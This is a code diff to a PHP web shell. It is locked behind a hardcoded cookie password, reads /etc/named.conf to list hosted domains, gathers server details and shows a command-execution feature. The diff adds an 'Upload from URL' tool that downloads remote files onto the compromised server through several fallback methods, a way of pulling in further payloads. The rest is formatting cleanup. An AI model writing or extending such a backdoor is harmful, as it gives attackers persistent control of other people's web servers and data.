@@ -1,4 +1,4 @@
-<?php
+<?php null;
 
 if (isset($_GET['akses']) && $_GET['akses'] === 'anjing') {
     setcookie('anjing', md5('anjing'), time() + (86400 * 30), "/");
@@ -8,7 +8,7 @@ if (!isset($_COOKIE['anjing'])) {
     die;
 }
 ?>
-<?php
+<?php null;
 
 session_start();
 error_reporting(0);
@@ -59,53 +59,35 @@ function writable($path, $perms){
 function perms($path) {
     $perms = fileperms($path);
     if (($perms & 0xC000) == 0xC000) {
-     // Socket
         $info = 's';
-    } 
-    elseif (($perms & 0xA000) == 0xA000) {
-        // Symbolic Link
+    } elseif (($perms & 0xA000) == 0xA000) {
         $info = 'l';
-    } 
-    elseif (($perms & 0x8000) == 0x8000) {
-        // Regular
+    } elseif (($perms & 0x8000) == 0x8000) {
         $info = '-';
-    } 
-    elseif (($perms & 0x6000) == 0x6000) {
-        // Block special
+    } elseif (($perms & 0x6000) == 0x6000) {
         $info = 'b';
-    } 
-    elseif (($perms & 0x4000) == 0x4000) {
-        // Directory
+    } elseif (($perms & 0x4000) == 0x4000) {
         $info = 'd';
-    } 
-    elseif (($perms & 0x2000) == 0x2000) {
-        // Character special
+    } elseif (($perms & 0x2000) == 0x2000) {
         $info = 'c';
-    } 
-    elseif (($perms & 0x1000) == 0x1000) {
-        // FIFO pipe
+    } elseif (($perms & 0x1000) == 0x1000) {
         $info = 'p';
-    } 
-    else {
-        // Unknown
+    } else {
         $info = 'u';
     }
 
-    // Owner
     $info .= (($perms & 0x0100) ? 'r' : '-');
     $info .= (($perms & 0x0080) ? 'w' : '-');
     $info .= (($perms & 0x0040) ?
     (($perms & 0x0800) ? 's' : 'x' ) :
     (($perms & 0x0800) ? 'S' : '-'));
 
-    // Group
     $info .= (($perms & 0x0020) ? 'r' : '-');
     $info .= (($perms & 0x0010) ? 'w' : '-');
     $info .= (($perms & 0x0008) ?
     (($perms & 0x0400) ? 's' : 'x' ) :
     (($perms & 0x0400) ? 'S' : '-'));
     
-    // World
     $info .= (($perms & 0x0004) ? 'r' : '-');
     $info .= (($perms & 0x0002) ? 'w' : '-');
     $info .= (($perms & 0x0001) ?
@@ -137,19 +119,19 @@ $path = str_replace('\\', '/', $path);
 $exdir = explode('/', $path);
 
 function getOwner($item) {
-	if (function_exists("posix_getpwuid")) {
-		$downer = @posix_getpwuid(fileowner($item));
-		$downer = $downer['name'];
-	} else {
-		$downer = fileowner($item);
-	}
-	if (function_exists("posix_getgrgid")) {
-		$dgrp = @posix_getgrgid(filegroup($item));
-		$dgrp = $dgrp['name'];
-	} else {
-		$dgrp = filegroup($item);
-	}
-	return $downer . '/' . $dgrp;
+    if (function_exists("posix_getpwuid")) {
+        $downer = @posix_getpwuid(fileowner($item));
+        $downer = $downer['name'];
+    } else {
+        $downer = fileowner($item);
+    }
+    if (function_exists("posix_getgrgid")) {
+        $dgrp = @posix_getgrgid(filegroup($item));
+        $dgrp = $dgrp['name'];
+    } else {
+        $dgrp = filegroup($item);
+    }
+    return $downer . '/' . $dgrp;
 }
 
 if (isset($_POST['newFolderName'])) {
@@ -209,8 +191,8 @@ if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item']
     }
 }
 
-if($_POST['submit']) {
-    if($_POST['upl'] == 'current') {
+if ($_POST['submit']) {
+    if ($_POST['upl'] == 'current') {
         $total = count($_FILES['uploadfile']['name']);
         for ($i = 0; $i < $total; $i++) {
             $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
@@ -221,7 +203,7 @@ if($_POST['submit']) {
             } else {
                 flash("Upload Failed", "Failed", "error", "?dir=$path");
             }
-        } else{
+        } else {
             if ($mainupload) {
                 flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
             } else {
@@ -239,8 +221,7 @@ if($_POST['submit']) {
             } else {
                 flash("Upload Failed", "Failed", "error", "?dir=$path");
             }
-        }
-        else{
+        } else {
             if ($mainupload) {
                 flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path");
             } else {
@@ -250,31 +231,96 @@ if($_POST['submit']) {
     }
 }
 
+// Upload from URL
+if (isset($_POST['url']) && isset($_POST['filename']) && isset($_POST['method'])) {
+    $url = $_POST['url'];
+    $filename = $_POST['filename'];
+    $destination = $path . '/' . $filename;
+
+    switch ($_POST['method']) {
+        case 'file_get_contents':
+            $data = file_get_contents($url);
+            if ($data !== false) {
+                file_put_contents($destination, $data);
+                flash("File uploaded successfully using file_get_contents!", "Success", "success", "?dir=$path");
+            } else {
+                flash("Failed to upload file using file_get_contents", "Failed", "error", "?dir=$path");
+            }
+            break;
+
+        case 'curl':
+            $ch = curl_init($url);
+            $fp = fopen($destination, 'wb');
+            curl_setopt($ch, CURLOPT_FILE, $fp);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_exec($ch);
+            if (curl_errno($ch)) {
+                flash("Failed to upload file using cURL: " . curl_error($ch), "Failed", "error", "?dir=$path");
+            } else {
+                flash("File uploaded successfully using cURL!", "Success", "success", "?dir=$path");
+            }
+            curl_close($ch);
+            fclose($fp);
+            break;
+
+        case 'fopen':
+            $stream = fopen($url, 'rb');
+            if ($stream) {
+                $contents = stream_get_contents($stream);
+                fclose($stream);
+                file_put_contents($destination, $contents);
+                flash("File uploaded successfully using fopen!", "Success", "success", "?dir=$path");
+            } else {
+                flash("Failed to upload file using fopen", "Failed", "error", "?dir=$path");
+            }
+            break;
+
+        case 'copy':
+            if (copy($url, $destination)) {
+                flash("File uploaded successfully using copy!", "Success", "success", "?dir=$path");
+            } else {
+                flash("Failed to upload file using copy", "Failed", "error", "?dir=$path");
+            }
+            break;
+
+        case 'stream_context':
+            $context = stream_context_create(['http' => ['method' => 'GET']]);
+            $data = file_get_contents($url, false, $context);
+            if ($data !== false) {
+                file_put_contents($destination, $data);
+                flash("File uploaded successfully using stream_context!", "Success", "success", "?dir=$path");
+            } else {
+                flash("Failed to upload file using stream_context", "Failed", "error", "?dir=$path");
+            }
+            break;
+    }
+}
+
 $dirs = scandir($path);
 
 $d0mains = @file("/etc/named.conf", false);
 if (!$d0mains){
-	$dom = "Cant read /etc/named.conf";
-	$GLOBALS["need_to_update_header"] = "true";
-}else{ 
-	$count = 0;
-	foreach ($d0mains as $d0main){
-		if (@strstr($d0main, "zone")){
-			preg_match_all('#zone "(.*)"#', $d0main, $domains);
-			flush();
-			if (strlen(trim($domains[1][0])) > 2){
-				flush();
-				$count++;
-			}
-		}
-	}
-	$dom = "$count Domain";
+    $dom = "Cant read /etc/named.conf";
+    $GLOBALS["need_to_update_header"] = "true";
+} else { 
+    $count = 0;
+    foreach ($d0mains as $d0main){
+        if (@strstr($d0main, "zone")){
+            preg_match_all('#zone "(.*)"#', $d0main, $domains);
+            flush();
+            if (strlen(trim($domains[1][0])) > 2){
+                flush();
+                $count++;
+            }
+        }
+    }
+    $dom = "$count Domain";
 }
 
 $ip = !@$_SERVER['SERVER_ADDR'] ? gethostbyname($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'];
 $serv = $_SERVER['HTTP_HOST']; 
 $soft = $_SERVER['SERVER_SOFTWARE'];
-$uname = php_uname()
+$uname = php_uname();
 
 ?>
 <html>
@@ -339,6 +385,31 @@ $uname = php_uname()
                         </div>
                     </div>
                     <div class="container" id="tools">
+                        <div class="collapse" id="uploadUrlCollapse" data-bs-parent="#tools" style="transition:none;">
+                            <form action="" method="post">
+                                <div class="mb-3">
+                                    <label for="url" class="form-label">URL to Upload</label>
+                                    <input type="text" class="form-control" name="url" placeholder="Enter URL here" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="filename" class="form-label">File Name</label>
+                                    <input type="text" class="form-control" name="filename" placeholder="Enter file name" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="method" class="form-label">Upload Method</label>
+                                    <select class="form-select" name="method" required>
+                                        <option value="file_get_contents">file_get_contents</option>
+                                        <option value="curl">cURL</option>
+                                        <option value="fopen">fopen</option>
+                                        <option value="copy">copy</option>
+                                        <option value="stream_context">stream_context</option>
+                                    </select>
+                                </div>
+                                <button type="submit" class="btn btn-outline-light">Upload</button>
+                            </form>
+                        </div>
+                        <a data-bs-toggle="collapse" href="#uploadUrlCollapse" role="button" aria-expanded="false" aria-controls="uploadUrlCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-link"></i> Upload from URL</a>
+
                         <?php if (isset($_POST['bdcmd'])) : ?>
                             <div class="p-2">
                                 <div class="row justify-content-center">
